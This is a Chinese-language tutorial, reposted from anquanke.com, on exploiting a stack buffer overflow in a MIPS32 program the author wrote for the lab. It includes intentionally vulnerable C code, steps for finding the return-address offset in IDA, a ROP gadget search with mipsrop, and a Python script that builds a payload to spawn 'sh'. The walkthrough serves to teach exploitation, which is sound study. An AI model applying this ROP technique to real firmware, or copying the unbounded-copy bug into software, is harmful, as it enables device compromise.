> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.anquanke.com](https://www.anquanke.com/post/id/240017)

> 栈是一种具有先进后出队列性质的数据结构。调用栈（Call Stack）是指存放某个程序正在运行的函数的信息的栈。调用栈由栈帧 (Stack Frame) 组成，每个栈帧对应一个未完成运行的函数。

[![](https://p5.ssl.qhimg.com/t01f281f44314df59ee.png)](https://p5.ssl.qhimg.com/t01f281f44314df59ee.png)

MIPS 堆栈原理
---------

栈是一种具有先进后出队列性质的数据结构。调用栈（Call Stack）是指存放某个程序正在运行的函数的信息的栈。调用栈由栈帧 (Stack Frame) 组成，每个栈帧对应一个未完成运行的函数。  
这里主要介绍 物联网设备中常见的指令架构 MIPS32 ，这个架构中的函数有两种，叶子函数和非叶子函数，判断叶子函数的方式只需要判断函数内是否调用其他函数，有调用则是非叶子函数，没有调用则是叶子函数，

### 非叶子函数调用过程

程序在跳转到非叶子函数以后，则非叶子函数会把调用它的函数的返回地址 (也就是 $RA 寄存器) 存入堆栈中，再将自己函数返回地址存入到 $RA，在函数返回时，非叶子函数会将栈中先前保存的返回地址取出保存到 $RA 中，再执行 “jr $ra”返回原函数。

### 叶子函数调用过程

程序在跳转到叶子函数中，过程比较简单，叶子函数不会改变寄存器 $RA 的值，因为函数跳转到它，就不会再有跳转了，因此在函数返回时，直接 “jr $ra” 返回原函数。

### 函数调用参数传递

在 MIPS 体系的函数调用过程中，通过 $a0~ $a3 传递前四个参数，多余的通过栈传递。

### 栈空间缓冲区溢出

栈空间缓冲区是用于内存中存储数据的内存区域。  
缓冲区溢出就是大缓冲区数据向小缓冲区复制的过程中，由于没有检查小缓冲区的边界或者检车不严格，导致小缓冲区明显不足以接收整个大缓冲区的数据，超出的部分覆盖了与小缓冲区相邻的内存区中的其他数据而引发的内存问题。  
成功利用缓冲区溢出可能造成严重的后果，基本上可分为 3 种情况，分别是拒绝服务、获得用户权限、获得系统权限。

接下来和我一起来学习栈空间缓冲区溢出吧！ ：）

环境搭建
----

系统：Ubuntu 16.04  
工具：IDA 7.5、QEMU  
mips 交叉编译环境

漏洞代码
----

```
mips_stack.c
#include <stdio.h>
#include <sys/stat.h>
#include <unistd.h>
void do_system(int code,char *cmd)
{
    char buf[255];
    
    system(cmd);
}
void main()
{
    char buf[256]={0};
    char ch;
    int count = 0;
    unsigned int fileLen = 0;
    struct stat fileData;
    FILE *fp;

    if(0 == stat("/home/tigerortiger/study/mips_stack/passwd",&fileData))
        fileLen = fileData.st_size;
    else
        return 1;
    if((fp = fopen("/home/tigerortiger/study/mips_stack/passwd","rb")) == NULL)
    {
        printf("Cannot open file passwd!n");
        exit(1);
    }    
    ch=fgetc(fp);
    printf("[+]  1 line : ");
    while(count <= fileLen)
    {
        buf[count++] = ch;
        ch = fgetc(fp);
    
    }
    buf[--count] = 'x00';
    printf("[+] passwd content : %s",buf[0]);
    if(!strcmp(buf,"adminpwd"))
    {        
        do_system(count,"ls -l");
    }
    else
    {
        printf("you have an invalid password!n");
    }
    fclose(fp);
}


```

编译
--

`./mips-linux-gcc -static /home/tigerortiger/study/mips_stack/stack.c -o stack`

文件分析
----

1、首先查看文件信息，可以看到是 mips32 架构

[![](https://p5.ssl.qhimg.com/t0198f11d653f26a680.png)](https://p5.ssl.qhimg.com/t0198f11d653f26a680.png)

2、根据查看 mips_stack.c 的源码或者运行文件可以知道，main() 函数会读取 passwd 文件，并且将文件的内容种存入局部变量 buf 中，而 buf 仅为 256 字节，如果 passwd 中的文件大于 256 字节，那么多余的字节就会导致缓冲区无法放下，造成溢出现象。  
3、生成 600 个字符串都 passwd  
`python -c "print 'A'*600">passwd`  
4、执行文件，可以看到”segmentation fault “

[![](https://p3.ssl.qhimg.com/t019645a5bd262e891b.png)](https://p3.ssl.qhimg.com/t019645a5bd262e891b.png)

5、接下来进行远程调试，查看栈上的情况  
`tigerortiger[@ubuntu](https://github.com/ubuntu "@ubuntu") ~/s/mips_stack> qemu-mips-static -g 1234 ./stack`  
6、使用 IDA 进行调试，连接，运行。

[![](https://p5.ssl.qhimg.com/t017b49487d18e6ef95.png)](https://p5.ssl.qhimg.com/t017b49487d18e6ef95.png)

7、程序在试图执行 0x41414141 处的指令时发生了崩溃, 这刚好是 AAAA 的十六进制，0x41414141 超出了进程, 引发了断段故障

[![](https://p4.ssl.qhimg.com/t0119f47cb38686b392.png)](https://p4.ssl.qhimg.com/t0119f47cb38686b392.png)

由此上述分析可知，文件存在缓冲区溢出的漏洞，并且可以将数据覆盖到 $RA 寄存器中。

漏洞 exploit 利用开发
---------------

完整漏洞利用开发过程应该是如下的步骤：  
1、计算局部变量到 返回地址的偏移，也就是 buf 到 $ra 的偏移，劫持 PC；  
2、寻找可利用的攻击方式和途径  
3、构造 ROP Chain  
4、编写漏洞利用程序

### 计算偏移

首先是确定 buf 到 $ra 的偏移  
这里介绍两种方法来进行计算  
**1、栈帧分析**  
通过静态分析，首先 F5 看程序的伪代码，需要确定 buf 离栈帧的地址，如下图所示，buf 会和 adminpwd 进行比较，因此根据 mips 种函数调用参数的特性，可以定位到 $a0，最终可以定位到 0x1C8+var_198，其中 0x1C8 是栈帧的地址。

[![](https://p3.ssl.qhimg.com/t01bf631d53a5de1349.png)](https://p3.ssl.qhimg.com/t01bf631d53a5de1349.png)

下面确定 buf 的偏移为 - 0x198 (这里的偏移都是相对栈帧 fp), 并且也确定了 $ra 的偏移为 0x4。

[![](https://p2.ssl.qhimg.com/t0173132fd8631174c8.png)](https://p2.ssl.qhimg.com/t0173132fd8631174c8.png)

如果需要使缓冲区溢出，控制堆栈的返回地址 $ra，需要覆盖的数据大小应该达到 0x4-(-0x198) = 0x19c 字节

[![](https://p3.ssl.qhimg.com/t01fb70dd96c039c650.png)](https://p3.ssl.qhimg.com/t01fb70dd96c039c650.png)

**2、使用脚本工具**  
脚本自取：【[https://github.com/desword/shellcode_tools/blob/master/patternLocOffset.py】](https://github.com/desword/shellcode_tools/blob/master/patternLocOffset.py%E3%80%91)  
使用脚本字符来将生成字符串存储到 passwd 中

[![](https://p5.ssl.qhimg.com/t01fe9977c39b0590ed.png)](https://p5.ssl.qhimg.com/t01fe9977c39b0590ed.png)

使用 IDA 进行远程调试，可以看到在 $ra 地址处是 0x6E37416E

[![](https://p1.ssl.qhimg.com/t0174561483d7ebb6ee.png)](https://p1.ssl.qhimg.com/t0174561483d7ebb6ee.png)

使用脚本计算偏移为 412，和上面栈帧分析的一样。

[![](https://p1.ssl.qhimg.com/t016c2d6a8d01e95a14.png)](https://p1.ssl.qhimg.com/t016c2d6a8d01e95a14.png)

[![](https://p1.ssl.qhimg.com/t01ee5255112c6ddeb3.png)](https://p1.ssl.qhimg.com/t01ee5255112c6ddeb3.png)

### 寻找可利用的攻击途径

通过对文件的静态分析，不难发现程序中调用了 do_system_0 函数，这个函数会调用 system() 函数来执行第二个参数，因此只需要将要执行的命令传入 do_system_0 函数的第二个参数 $a1 中即可。

[![](https://p3.ssl.qhimg.com/t014ebe85f5465cf39b.png)](https://p3.ssl.qhimg.com/t014ebe85f5465cf39b.png)

### 构造 ROP chain

这里需要用到 IDA 脚本插件 mipsrop.py  
**1、安装 mipsrop.py**  
下载，完了放到 ida 的 plugins 目录就行，重启 IDA。  
【[https://github.com/devttys0/ida/blob/master/plugins/mipsrop/mipsrop.py】](https://github.com/devttys0/ida/blob/master/plugins/mipsrop/mipsrop.py%E3%80%91)  
2、打开你的 mips 程序，点击 search——>mips rop gadgets 。

[![](https://p0.ssl.qhimg.com/t019adf05014ee76296.png)](https://p0.ssl.qhimg.com/t019adf05014ee76296.png)

3、输入 “mipsrop.stackfinder() ” 查找可用的 godget

[![](https://p4.ssl.qhimg.com/t011f0e75e2ed52c72f.png)](https://p4.ssl.qhimg.com/t011f0e75e2ed52c72f.png)

4、双击 0x00403810 可以看到这里，下面红色框中的代码我们可以用来构造 rop chain。  
为什么这段代码可以使用，是因为我们上面分析过，需要给 do_system_0 函数 $a1 传递我们要执行的命令，恰好 0x00403810 此处将 $sp+0x54+var_30 内存中值赋值给 $a1，只需要将要执行的命令放在 $sp+0x54+var_30 处，另外我们要调用 do_system_0 函数，下面 0x00403814 处 将 $sp+0x54+var_s0 的值加载到 $ra 寄存中，后面会执行” jr $ra”, 让程序跳转到 do_system_0 继续执行。

[![](https://p5.ssl.qhimg.com/t01b3fc4f8168b23d89.png)](https://p5.ssl.qhimg.com/t01b3fc4f8168b23d89.png)

6、最终构造的 ROP chain 如下图所示

[![](https://p2.ssl.qhimg.com/t01d885a4658c07cea3.png)](https://p2.ssl.qhimg.com/t01d885a4658c07cea3.png)

### 编写漏洞利用程序

```
import struct

print("[*] prepare shellcode")

cmd = "sh"
cmd += "\00"*(4-(len(cmd) %4))  
shellcode = "A"*0x19C
shellcode += struct.pack(">L",0x00403810)
shellcode += "A"*24
shellcode += cmd
shellcode += "B"*(0x3C - len(cmd))
shellcode += struct.pack(">L", 0x00400680)
shellcode += "BBBB"
print("OK!")

print("[+] create password file")
fw = open('passwd','w')
fw.write(shellcode)
fw.close()
print("ok")


```

执行 exploit
----------

[![](https://p4.ssl.qhimg.com/t014c378ba1ea76448d.png)](https://p4.ssl.qhimg.com/t014c378ba1ea76448d.png)